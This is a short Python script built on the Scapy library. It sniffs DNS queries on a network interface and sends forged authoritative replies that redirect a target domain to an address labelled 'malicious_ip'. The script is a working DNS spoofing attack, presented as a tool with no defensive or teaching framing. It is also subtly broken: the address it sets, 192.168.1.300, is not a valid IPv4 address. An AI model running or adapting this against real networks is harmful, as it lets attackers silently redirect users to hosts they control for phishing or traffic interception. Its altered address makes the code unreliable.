#!/usr/bin/env python3

# Import Scapy
from scapy.all import *

# Define the target domain and the malicious IP address
target_domain = "example.com"
malicious_ip = "192.168.1.300"  # Changed from 192.168.1.100

# Define a function to process DNS packets


def process_packet(packet):
    # Check if the packet has DNS layer and DNS query
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        # Get the DNS query name
        query = packet.getlayer(DNS).qd.qname
        # Check if the query matches the target domain
        if query.decode() == target_domain + ".":
            # Print a message
            print(f"DNS request for {target_domain} detected")
            # Construct a fake DNS response with the malicious IP address
            fake_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                    an=DNSRR(rrname=query, ttl=10, rdata=malicious_ip))
            # Send the fake response
            send(fake_response)
            # Print a message
            print(f"Fake DNS response sent: {query} -> {malicious_ip}")


# Sniff DNS packets on the network interface eth0
sniff(iface="eth0", filter="port 53", prn=process_packet)
